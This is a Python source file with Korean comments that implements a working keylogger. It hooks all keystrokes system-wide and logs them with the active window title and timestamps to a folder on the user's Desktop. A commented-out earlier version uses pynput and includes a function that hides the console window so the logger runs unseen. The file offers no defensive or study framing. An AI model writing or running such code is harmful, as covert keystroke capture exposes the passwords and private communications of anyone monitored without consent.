import keyboard  # 사용자의 키보드 데이터를 입력 받기 위해 사용
import os  # 사용자의 디렉토리에 접근하기 위해 사용
import time  # 실시간 정보를 얻기 위해 사용
import pygetwindow  # 현재 활성 창의 제목을 얻기 위해 사용

# 사용자 Desktop 경로 자동 설정
user_desktop = os.path.join(os.path.expanduser("~"), "Desktop")
log_add = os.path.join(user_desktop, "keylog")  # 저장할 경로
log_name = time.strftime("%Y%m%d_%Hh%Mm") + ".log"  # 로그 파일명
log_path = os.path.join(log_add, log_name)  # 저장할 경로 + 로그 파일명

# 로그파일 생성 함수
def create_log():
    global log_add
    global log_path
    if not os.path.isdir(log_add):  # 저장할 경로에 디렉토리가 없을 경우
        os.makedirs(log_add)  # 경로에 디렉토리들을 모두 생성

    with open(log_path, 'w', encoding='utf-8') as f:  # 로그파일을 생성한다
        f.write("=============Keylogger Start=============\n")

# 사용자의 키보드를 입력 받는 함수
def input_key(event):
    global key_data
    global log_path
    
    key = event.name
    if len(key) == 1:
        key_data += key
    else:
        key_data += ' [' + key + ']'
    
    if key == 'enter':  # enter키를 입력 받을 때
        with open(log_path, 'a', encoding='utf-8') as f:  # 로그 파일에 추가 작성한다
            key_data += "\n"
            f.write('[' + pygetwindow.getActiveWindow().title + ']' + '[' + time.strftime("%Y-%m-%d %H:%M:%S") + '] : ' + key_data + '\n')
            key_data = ""

# 전역 변수 선언
key_data = ""  # 사용자가 키보드에 입력할 문자열들을 저장할 문자열변수 

# 로그파일 생성
create_log() 

# 키 입력을 감지하여 input_key 함수 호출
keyboard.on_press(input_key)

# 프로그램을 계속 실행
keyboard.wait()





"""
from pynput.keyboard import Key, Listener   # 사용자의 키보드 데이터를 입력 받기 위해 사용
import os	                                # 사용자의 디렉토리에 접근하기위해 사용
import time	                                # 실시간 정보를 얻기위해 사용
#import win32console, win32gui	            # CMD를 숨기기위해 사용

# 전역 변수 선언
key_data = ""                                       # 사용자가 키보드에 입력할 문자열들을 저장할 문자열변수 
log_add = "C:\\Users\\r2com\\Desktop\\keylog\\"     # 저장할 경로 
log_name = time.strftime("%Y%m%d_%Hh%Mm")+".log"    # 로그 파일 명
log_path = log_add + log_name                       # 저장할 경로 + 로그 파일명

# CMD 숨기는 함수
def hide_window():
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win,0)

# 로그파일 생성 함수
def create_log():
    global log_add	
    global log_path
    if os.path.isdir(log_add) == False:	        # 저장할 경로에 디렉토리가 없을 경우
        os.makedirs(log_add)	                # 경로에 디렉토리들을 모두 생성

    else: 						                # 저장할 경로에 디렉토리가 있을경우
        with open(log_path,'w') as f:			# 로그파일을 생성한다
            f.write("=============Keylogger Start=============\n")

# 사용자의 키보드를 입력 받는 함수
def input_key(key): 
    global key_data
    global log_path
        
    try:
        if key.char is not None:                        # key.char가 None이 아닐 때만 추가	
            key_data += key.char                        # 입력 받은 문자를 문자열 변수에 추가하며 저장한다
    except AttributeError:
        if(key != Key.shift_l and key != Key.shift_r):	# shift를 제외한 키를 입력 받을 때
            key_data += ' ' + '[' + str(key) + ']'
        if(key == Key.enter):	                        # enter키를 입력 받을 때
            with open(log_path,'a') as f:               # 로그 파일에 추가 작성한다
                key_data += "\n"
                f.write('[' + time.strftime("%Y-%m-%d %H:%M:%S") + '] : ' + str(key_data))
                key_data = "" 
        if(key == Key.esc):	                            # esc키를 입력 받을 때
            with open(log_path,'a') as f:	            # esc 키를 입력 받고 종료	
                f.write("shutdown : esc")
            return False
   
#hide_window()                                      # cmd 숨기기
create_log()                                        # 로그파일 생성
with Listener(on_press = input_key) as listener:    # 키가 입력 받았을 때 실행
    listener.join()
"""    